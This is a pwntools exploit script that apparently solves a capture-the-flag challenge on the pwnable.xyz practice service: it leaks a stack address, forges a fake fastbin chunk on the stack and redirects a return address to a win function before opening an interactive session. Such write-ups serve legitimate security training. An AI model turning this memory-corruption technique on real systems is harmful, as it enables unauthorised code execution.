from pwn import * 
from time import time


e = ELF('./challenge')
p = process(e.path)
p = remote("svc.pwnable.xyz", 30005)

offset = 0x48

winaddr = p64(0x400A3E)
nop = p64(0x400746)

def write_stack(addr, data):
    p.recvuntil(b'> ')
    p.send(b'1')
    sleep(1)
    p.send(b'A'*8 + addr +b'B'*16)
    p.recvuntil(b'> ')
    p.send(b'3')
    p.recvuntil(b'> ')
    p.send(b'1')
    sleep(1)
    p.send(data)


p.recvuntil(b'> ')
p.send(b'2')
retAddrStackAddr = (int(p.recvuntil(b'\n')[2:-1],16) ) + offset
print(hex(retAddrStackAddr))
payload = p64(retAddrStackAddr)
align = 16 # fake chunk must be 16 bit aligned
retAddrStackAddr = (retAddrStackAddr - 0x2000 - offset)& (~(align-1))
retAddrStackAddr = retAddrStackAddr-0x10 -16
fakeHeapAddr = p64(retAddrStackAddr) 
write_stack(addr=payload,data=b'C'*8+fakeHeapAddr+nop+winaddr)

p.recvuntil(b'> ')
p.send(b'3')
p.recvuntil(b'> ')


#struct fast_chunk {
#  size_t prev_size;
#  size_t size;
#  struct fast_chunk *fd;
#  struct fast_chunk *bk;
#  char buf[0x20];                   // chunk falls in fastbin size range
#};

#now im writing to my fake heap chunk
fake_chunk_1 = b'A'*8
fake_chunk_1 += p64(retAddrStackAddr+32)
fake_chunk_1 += p64(0x40) #prev_size 8
fake_chunk_1 += p64(0x40) #size 16
#fake_chunk_1 += p64(retAddrStackAddr+48) #fd
#fake_chunk_1 += p64(retAddrStackAddr+48) #bk
#fake_chunk_1 += b'D' * 0x20

p.send(b'1')
sleep(1)
p.send(fake_chunk_1)
p.recvuntil(b'> ')
p.send(b'3')
p.send(b'0')

p.interactive()